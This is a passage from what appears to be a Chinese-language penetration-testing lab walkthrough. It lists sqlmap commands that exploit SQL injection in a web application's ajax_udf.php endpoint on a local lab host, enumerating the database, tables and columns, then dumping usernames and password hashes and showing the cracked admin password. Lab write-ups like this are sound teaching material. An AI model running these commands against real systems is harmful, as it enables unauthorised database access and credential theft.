### **3.2 爆破数据**

#### 1.使用SQLmap进行测试

```
sqlmap -u "http://192.168.1.7/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" --risk=3 --level=5 --dbs --threads=4 --batch
```

![](../Images/8d8857155db023145e06feaa000d7b4f.png)

#### 2.爆破数据库

```
sqlmap -u "http://192.168.1.7/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -D jabcd0cs --risk=3 --level=5 --threads=4 --tables --batch
```

![](../Images/4965686bacacd4925b1ae1224b34a87d.png)

#### 3.爆破列内容

```
sqlmap -u "http://192.168.1.7/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -D jabcd0cs --risk=3 --level=5 --threads=4 -T odm\_user --batch --columns
```

![](../Images/08a32b78a8b7d8e9ae60f11758820112.png)

#### 4.爆破用户名和密码

```
sqlmap -u "http://192.168.1.7/jabcd0cs/ajax\_udf.php?q=1&add\_value=odm\_user" -D jabcd0cs --risk=3 --level=5 --threads=4 -T odm\_user --batch -C 'username,password' --dump
```

![](../Images/fea6aa7acd0a1f1b789f2c3e5b81fda7.png)

#### 5.解密webadmin

解密后获取密码为：`webmin1980`

![](../Images/c137df979d9673ceab237032bf61da4c.png)
